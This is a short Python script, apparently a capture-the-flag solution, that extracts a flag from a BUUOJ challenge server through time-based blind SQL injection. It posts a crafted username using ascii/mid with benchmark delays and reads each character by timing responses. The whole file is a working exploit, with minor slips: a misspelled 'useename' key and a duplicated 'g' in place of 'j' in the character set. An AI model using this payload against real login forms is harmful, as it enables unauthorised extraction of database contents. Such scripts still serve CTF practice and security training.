import requests
import time
import threading

def go():
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36'}
    chars = 'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.}{'
    flag = ''
    payload = {
        "useename" : "",
        "password" : "123"
    }
    for i in range(1,50):
        #print(i)
        for char in chars:
            charAscii = ord(char) #char转换为asciis
            url = 'http://a8e9dbf5-0670-4775-99b9-d08a91183431.node4.buuoj.cn:81/index.php'
            payload["username"] = "0'^if(ascii(mid((select(cmd)from(flaggg)),{0},1))={1},(select(benchmark(20000000,md5(0x41)))),1),'1')#".format(i,charAscii)
            start_time = time.time()
            requests.post(url,data=payload,headers=headers,timeout=None)
            if  time.time() - start_time > 3:
                flag+=char
                print('flag: ',flag)
                break
            else:
                pass
    print('flag is ' + flag)

if __name__ == '__main__':
    t = threading.Thread(target=go)
    t.start()